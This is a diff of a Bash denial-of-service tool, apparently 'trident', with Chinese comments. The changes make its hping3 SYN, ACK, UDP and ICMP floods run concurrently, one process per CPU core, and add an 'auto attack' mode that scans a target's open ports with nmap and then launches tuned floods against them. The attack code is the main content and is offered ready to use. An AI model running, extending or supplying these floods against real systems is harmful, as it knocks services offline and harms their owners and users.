@@ -2,7 +2,8 @@
 # Repository <https://github.com/sshpc/trident>
 export LANG=en_US.UTF-8
 
-selfversion='0.4.1'
+# 全局变量
+selfversion='0.5'
 datevar=$(date +%Y-%m-%d_%H:%M:%S)
 menuname='首页'
 parentfun=''
@@ -12,16 +13,12 @@ upgrade="apt -y update"
 release='linux'
 # 获取 CPU 核心数
 CONCURRENT_ATTACKS=$(nproc)
-# 脚本退出时清理
-trap cleanup EXIT
 
-# 全局变量
 TARGET_IP=""
 SOURCE_IP=""
 DURATION=10
 PACKET_SIZE=120
 TARGET_PORT=80
-CONCURRENT_ATTACKS=0
 
 # 目录和文件路径
 TRIDENT_TMP_DIR="$HOME/trident_tmp"
@@ -54,16 +51,25 @@ waitinput() {
 
 # 加载动画
 loading() {
-    local pid=$1
+    local pids=("$@")
     local delay=0.1
     local spinstr='|/-\'
     tput civis # 隐藏光标
-    while kill -0 $pid 2>/dev/null; do
-        local temp=${spinstr#?}
-        printf "\r\033[0;31;36m[ %c ] 正在执行...\033[0m" "$spinstr"
-        local spinstr=$temp${spinstr%"$temp"}
-        sleep $delay
+
+    while :; do
+        local all_done=true
+        for pid in "${pids[@]}"; do
+            if kill -0 "$pid" 2>/dev/null; then
+                all_done=false
+                local temp=${spinstr#?}
+                printf "\r\033[0;31;36m[ %c ] 正在执行 ...\033[0m" "$spinstr"
+                local spinstr=$temp${spinstr%"$temp"}
+                sleep $delay
+            fi
+        done
+        [[ $all_done == true ]] && break
     done
+
     tput cnorm        # 恢复光标
     printf "\r\033[K" # 清除行
 }
@@ -78,10 +84,6 @@ jumpfun() {
     done
     echo
 }
-
-
-
-
 
 #检查系统
 checkSystem() {
@@ -179,7 +181,7 @@ menu() {
         parentfun=${options[action_index]}
         ${options[action_index]}
         waitinput
-        ${FUNCNAME[3]}
+        main
         ;;
     0) main ;;
     b) ${FUNCNAME[3]} ;;
@@ -285,6 +287,7 @@ execute_attack() {
         hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag -p "$target_port" --flood $sourcepattern "$target_ip" &
     fi
 }
+
 # 新增参数验证函数
 validate_params() {
     local required_params=("$@")
@@ -340,17 +343,19 @@ hping3_attack() {
         local attack_flag=$2
 
         if [[ "$attack_type" == "ICMP" ]]; then
-        validate_params "IP" "SIZE" "TIME"
+            validate_params "IP" "SIZE" "TIME"
         else
-        validate_params "IP" "PORT" "SIZE" "TIME"
+            validate_params "IP" "PORT" "SIZE" "TIME"
         fi
 
-
         jumpfun "开始执行攻击..."
-        execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$TARGET_PORT" "$PACKET_SIZE" "$DURATION"
-        local pid=$!
-        loading $pid
-        wait $pid
+        local pids=()
+        for ((i = 0; i < CONCURRENT_ATTACKS; i++)); do
+            execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$TARGET_PORT" "$PACKET_SIZE" "$DURATION"
+            pids+=($!) # 收集子进程 PID
+        done
+        loading "${pids[@]}" # 显示加载动画
+        wait # 等待所有子进程完成
         jumpfun "攻击完成"
     }
 
@@ -368,10 +373,9 @@ auto_attack() {
     menuname="首页/全自动攻击"
     validate_params "IP"
 
-
     _yellow "开始扫描目标的常用端口..."
     local open_ports=$(nmap -p 1-1024,3306,3389,8080,8888,8443 --min-rate=1000 -T4 "$TARGET_IP" | grep 'open' | awk -F '/' '{print $1}')
-    jumpfun "开放端口: $open_ports"
+    _yellow "开放端口: $open_ports"
 
     local attack_types=()
     if [[ -n "$open_ports" ]]; then
@@ -384,22 +388,40 @@ auto_attack() {
         attack_types+=("ICMP" "--icmp" "")
     fi
 
-    #并发攻击
+    jumpfun "开始自动攻击..."
+    local pids=()
+     #并发攻击
     for ((i = 0; i < ${#attack_types[@]}; i += 3)); do
         local attack_type=${attack_types[i]}
         local attack_flag=${attack_types[i + 1]}
         local target_port=${attack_types[i + 2]}
 
-        _yellow "执行 $attack_type 攻击..."
-        execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$target_port" 120 60
+        # 动态调整攻击参数
+        case "$attack_type" in
+            "UDP")
+            PACKET_SIZE=512 # 对于 UDP 攻击，增加数据包大小
+            ;;
+            "ICMP")
+            DURATION=5 # 对于 ICMP 攻击，缩短持续时间
+            ;;
+            "SYN" | "ACK")
+            PACKET_SIZE=120 # 对于 SYN/ACK 攻击，使用默认数据包大小
+            ;;
+        esac
 
-        # 控制并发数
-        while [[ $(jobs -r | wc -l) -ge $CONCURRENT_ATTACKS ]]; do
-            sleep 1
-        done
+        _yellow "执行 $attack_type 攻击..."
+        execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$target_port" "$PACKET_SIZE" "$DURATION"
+        pids+=($!) # 收集子进程 PID
+
+        # 计算若超过cpu核数退出循环
+        if [[ ${#pids[@]} -gt $CONCURRENT_ATTACKS ]]; then
+            break
+        fi
     done
+
+    loading "${pids[@]}" 
     wait # 等待所有子进程完成
-    _green "全自动攻击完成"
+    _green "自动攻击完成"
 }
 
 # NMAP扫描函数
@@ -491,5 +513,7 @@ if [ ! -d "$TRIDENT_TMP_DIR" ]; then
     mkdir -p "$TRIDENT_TMP_DIR"
 fi
 
+# 脚本退出时清理
+trap cleanup EXIT
 
 main
